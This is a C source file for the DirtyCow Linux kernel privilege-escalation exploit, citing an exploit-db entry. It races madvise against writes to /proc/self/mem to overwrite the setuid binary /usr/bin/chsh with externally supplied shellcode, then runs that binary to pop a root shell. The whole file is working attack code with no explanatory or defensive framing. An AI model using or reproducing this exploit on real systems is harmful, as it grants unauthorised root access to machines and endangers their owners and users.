//gcc dc.c -pthread -o dc
//https://www.exploit-db.com/exploits/40616/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

extern unsigned char sc[];
extern unsigned int sc_len;

void* map;
int ff;
int stop=0;
struct stat st;
char* name;
pthread_t pth1,pth2,pth3;
char suid_binary[]="/usr/bin/chsh";

void* madviseThread(void* arg)
{
	int ii,cc=0;
	for(ii=0;ii<1000000&&!stop;++ii)
		cc+=madvise(map,100,MADV_DONTNEED);
	printf("thread stopped\n");
	return 0;
}

void* procselfmemThread(void* arg)
{
	char* str=(char*)arg;
	int ff=open("/proc/self/mem",O_RDWR);
	int ii,cc=0;
	for(ii=0;ii<1000000&&!stop;++ii)
	{
		lseek(ff,(__off_t)map,SEEK_SET);
		cc+=write(ff,str,sc_len);
	}
	printf("thread stopped\n");
	return 0;
}

void* waitForWrite(void* arg)
{
	char buf[sc_len];
	while(1)
	{
		FILE* fp=fopen(suid_binary,"rb");
		fread(buf,sc_len,1,fp);
		if(memcmp(buf,sc,sc_len)==0)
		{
			printf("%s overwritten\n",suid_binary);
			break;
		}
		fclose(fp);
		sleep(1);
	}
	stop=1;
	printf("Popping root shell.\n");
	printf("Don't forget to restore /tmp/bak\n");
	system(suid_binary);
	return 0;
}

int main(int argc,char* argv[])
{
	char* backup;
	printf("DirtyCow root privilege escalation\n");
	printf("Backing up %s to /tmp/bak\n",suid_binary);
	asprintf(&backup,"cp %s /tmp/bak",suid_binary);
	system(backup);
	ff=open(suid_binary,O_RDONLY);
	fstat(ff,&st);
	printf("Size of binary: %d\n",(int)st.st_size);
	char payload[st.st_size];
	memset(payload,0x90,st.st_size);
	memcpy(payload,sc,sc_len+1);
	map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,ff,0);
	printf("Racing,this may take a while..\n");
	pthread_create(&pth1,NULL,&madviseThread,suid_binary);
	pthread_create(&pth2,NULL,&procselfmemThread,payload);
	pthread_create(&pth3,NULL,&waitForWrite,NULL);
	pthread_join(pth3,NULL);
	return 0;
}